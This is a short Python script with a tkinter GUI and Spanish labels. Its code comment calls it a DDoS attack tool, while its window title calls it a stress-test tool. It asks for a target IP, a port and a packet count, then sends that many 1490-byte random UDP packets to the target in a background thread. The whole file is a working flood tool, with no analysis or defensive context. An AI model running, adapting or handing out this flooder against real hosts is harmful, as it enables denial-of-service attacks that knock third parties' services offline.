import tkinter as tk
import socket
import random
import threading
from datetime import datetime

# Función para iniciar el ataque DDoS
def iniciar_ataque():
    ip_target = ip_entry.get()
    try:
        port = int(port_entry.get())
        total_paquetes = int(packets_entry.get())
    except ValueError:
        result_label.config(text="Ingresa valores válidos")
        return

    result_label.config(text="Ataque en progreso...")
    attack_button.config(state=tk.DISABLED)

    def realizar_ataque():
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_bytes = random._urandom(1490)

        for i in range(total_paquetes):
            udp_socket.sendto(udp_bytes, (ip_target, port))
            progress = (i + 1) / total_paquetes * 100
            progress_label.config(text=f"Progreso: {int(progress)}%")

        udp_socket.close()
        result_label.config(text="Ataque completado.")
        attack_button.config(state=tk.NORMAL)

    threading.Thread(target=realizar_ataque).start()

# Configuración de la ventana GUI
window = tk.Tk()
window.title("Herramienta de Prueba de Estrés")

ip_label = tk.Label(window, text="IP del objetivo:")
ip_label.pack()
ip_entry = tk.Entry(window)
ip_entry.pack()

port_label = tk.Label(window, text="Puerto:")
port_label.pack()
port_entry = tk.Entry(window)
port_entry.pack()

packets_label = tk.Label(window, text="Cantidad de paquetes:")
packets_label.pack()
packets_entry = tk.Entry(window)
packets_entry.pack()

attack_button = tk.Button(window, text="Iniciar Ataque", command=iniciar_ataque)
attack_button.pack()

progress_label = tk.Label(window, text="Progreso: 0%")
progress_label.pack()

result_label = tk.Label(window, text="")
result_label.pack()

window.mainloop()
